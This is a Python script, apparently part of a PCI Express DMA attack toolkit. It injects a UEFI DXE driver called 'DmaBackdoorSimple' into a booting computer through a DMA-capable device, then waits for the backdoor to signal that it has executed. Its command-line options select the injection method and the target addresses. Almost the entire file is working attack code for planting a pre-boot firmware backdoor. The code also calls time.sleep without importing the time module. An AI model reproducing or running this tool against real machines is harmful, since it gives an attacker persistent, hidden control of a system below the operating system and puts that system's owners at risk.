#!/usr/bin/env python

import sys, os
from struct import pack, unpack
from optparse import OptionParser

from pcie_lib import *
from uefi import *

# payload DXE driver
DRIVER_PATH = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi')

def inject(driver = None, test = False, method = None, system_table = None, prot_entry = None):

    driver = DRIVER_PATH if driver is None else driver
    method = DXE_INJECT_ST if method is None else method

    # inject DXE driver into the booting system
    dev = dxe_inject(method = method, payload = None if test else driver, 
                     system_table = system_table, prot_entry = prot_entry)

    if test:

        return dev

    print('[+] DXE driver was planted, waiting for backdoor init...')

    while True:

        # wait for DXE backdoor
        status = dev.mem_read_8(STATUS_ADDR)
        
        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        print('[+] DXE driver was executed')

        break

    print('[+] DONE')

    return dev

def main():

    parser = OptionParser()

    parser.add_option('-d', '--driver', dest = 'driver', default = DRIVER_PATH,
        help = 'payload file path')

    parser.add_option('-s', '--system-table', dest = 'system_table', default = None,
        help = 'EFI_SYSTEM_TABLE address')

    parser.add_option('-e', '--prot-entry', dest = 'prot_entry', default = None,
        help = 'PROTOCOL_ENTRY address')

    parser.add_option('-t', '--test', dest = 'test', default = False, action = 'store_true',
        help = 'test run, don\'t execute an actual DXE driver')

    parser.add_option('--inj-prot', dest = 'inj_prot', default = False, action = 'store_true',
        help = 'use DXE protocol hook injection method')

    # parse command line
    options, _ = parser.parse_args()

    options.system_table = None if options.system_table is None else int(options.system_table, 16)
    options.prot_entry = None if options.prot_entry is None else int(options.prot_entry, 16)

    try:        

        # perform the attack
        dev = inject(driver = options.driver, test = options.test, 
                     method = DXE_INJECT_PROT if options.inj_prot else DXE_INJECT_ST, 
                     system_table = options.system_table, prot_entry = options.prot_entry)

        if dev is not None:

            dev.close()
            return 0

    except AssertionError:

        raise

    except KeyboardInterrupt:

        print('\n')    

    except Exception, why:

        print('ERROR: %s' % str(why))

    return -1

if __name__ == '__main__':

    exit(main())

#
# EoF
#
